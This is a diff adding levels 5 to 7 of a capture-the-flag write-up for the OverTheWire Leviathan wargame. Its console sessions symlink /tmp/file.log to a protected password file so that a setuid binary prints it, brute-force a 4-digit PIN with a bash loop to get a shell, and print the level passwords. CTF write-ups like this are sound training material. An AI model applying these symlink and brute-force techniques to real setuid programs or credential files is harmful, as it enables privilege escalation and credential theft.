@@ -255,13 +255,114 @@ Interesting... it's a Binary Output. Let's go online, and use a Binary to ASCII 
 Easy enough, not too hard if you know what you were looking at. Let's move on to leviathan5!
 
 ### Level 5 -> 6:
+Alright, so far we had some easy ones and some hard ones... let's see what's in store for us on Leviathan5.
 
 ```console
-
+leviathan5@melinda:~$ ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan6 leviathan5 7634 Nov 14  2014 leviathan5
 ```
+
+Another executable, okay. Let's run it and see what we get.
+
+```console
+leviathan5@melinda:~$ ./leviathan5
+Cannot find /tmp/file.log
+```
+
+Okay. So it seems that the executable is trying to pull information on a file that doesn't exist. Let's run an `ltrace` and see what is being called.
+
+```console
+leviathan5@melinda:~$ ltrace ./leviathan5
+__libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 <unfinished ...>
+fopen("/tmp/file.log", "r")                      = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+```
+
+Interesting, it seems that the executable is using `fopen` on __/tmp/file.log__. Let's go ahead and create a symlink to __/etc/leviathan_pass/levithan6__ and link it to __/tmp/file.log__.
+
+```console
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+leviathan5@melinda:~$ ./leviathan5
+UgaoFee4li
+```
+
+Easy enough! We got the password and we can move on to leviathan6!
 
 ### Level 6 -> 7:
+As always, let's run `ls -la` and see what we have to work with.
 
 ```console
-
+leviathan6@melinda:~$ ls -la
+total 28
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r-sr-x---   1 leviathan7 leviathan6 7484 Nov 14  2014 leviathan6
+leviathan6@melinda:~$ ./leviathan6
+usage: ./leviathan6 <4 digit code>
 ```
+
+Another executable, shocker... really. It seems that this one is asking for us to input a 4 digit pin. Let's try and brute force it! Let's start creating a tmp directory and opening `nano` to write a shell script.
+
+```console
+leviathan6@melinda:~$ mkdir /tmp/jhalon
+leviathan6@melinda:~$ nano /tmp/jhalon/brute.sh
+```
+
+Our shell script will look something like this...
+
+```bash
+#!/bin/bash
+
+for a in {0000..9999}
+do
+~/leviathan6 $a
+done
+```
+
+Save the script as `bash.sh` or anything you'd like for that matter, and let's use `chmod` to give it executable permissions. Once done, let's run the script.
+
+```console
+leviathan6@melinda:/tmp/jhalon$ chmod +x brute.sh
+leviathan6@melinda:/tmp/jhalon$ ./brute.sh
+```
+
+Give the script ~20 seconds to run and you should see a blank command line with `$` appear... 
+
+```console
+$ whoami 
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+```
+Done! We got the password! Technically this is the last level... but let's SSH into leviathan7 to see what's in there.
+
+### Level 7
+
+```console
+eviathan7@melinda:~$ ls -la
+total 24
+drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
+drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
+-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
+-r--r-----   1 leviathan7 leviathan7  178 Nov 14  2014 CONGRATULATIONS
+leviathan7@melinda:~$ cat CON*
+Well Done, you seem to have used a *nix system before, now try something more serious.
+```
+
+Congratulations! You have conquered __Leviathan__! 
+
+Stay tuned for more OverTheWire write-ups, and an upcoming POC for Webcam hacking!
